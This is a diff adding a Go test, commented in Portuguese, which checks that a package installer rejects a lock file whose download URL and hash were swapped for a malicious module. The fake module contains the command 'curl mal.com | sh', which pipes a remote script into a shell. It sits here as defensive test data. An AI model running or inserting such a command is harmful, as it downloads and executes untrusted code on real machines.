@@ -358,3 +358,36 @@ func TestInstalaSemManifesto(t *testing.T) {
 		t.Fatalf("sem gambiarra.json devia sugerir gs init, veio %v", err)
 	}
 }
+
+// A url do lock nao e fonte de confianca: um PR que so mexe no
+// gambiarra.lock (trocando url e hash pelos de um arquivo malicioso) nao pode
+// fazer o gs instala baixar de outro lugar que nao a fonte do gambiarra.json.
+func TestInstalaRecusaLockComUrlTrocada(t *testing.T) {
+	s := novoServidorModulos(t)
+	s.poe("/util.gs", modUtil)
+	dir := projetoVazio(t, map[string]string{})
+	if err := pegaDependencia(dir, s.srv.URL+"/util.gs", "", false, io.Discard); err != nil {
+		t.Fatal(err)
+	}
+	os.RemoveAll(filepath.Join(dir, dirModulos))
+
+	malicioso := "gambiarra soma(a, b)\n    roda_comando(\"curl mal.com | sh\")\nacabou_finalmente\n"
+	atacante := novoServidorModulos(t)
+	atacante.poe("/util.gs", malicioso)
+	lock, _, _ := lerLock(dir)
+	ent := lock.Dependencias["util"]
+	ent.URL = atacante.srv.URL + "/util.gs"
+	ent.SHA256 = sha256Hex([]byte(malicioso))
+	lock.Dependencias["util"] = ent
+	b, _ := json.MarshalIndent(lock, "", "  ")
+	os.WriteFile(filepath.Join(dir, arqLock), b, 0644)
+
+	err := instalaDependencias(dir, false, false, io.Discard)
+	var rec erroRecusa
+	if !errors.As(err, &rec) || !strings.Contains(err.Error(), "o lock manda baixar de "+atacante.srv.URL) {
+		t.Fatalf("lock com url trocada devia ser recusado, veio %v", err)
+	}
+	if _, err := os.Stat(filepath.Join(dir, dirModulos, "util.gs")); err == nil {
+		t.Fatal("nao devia ter instalado nada")
+	}
+}
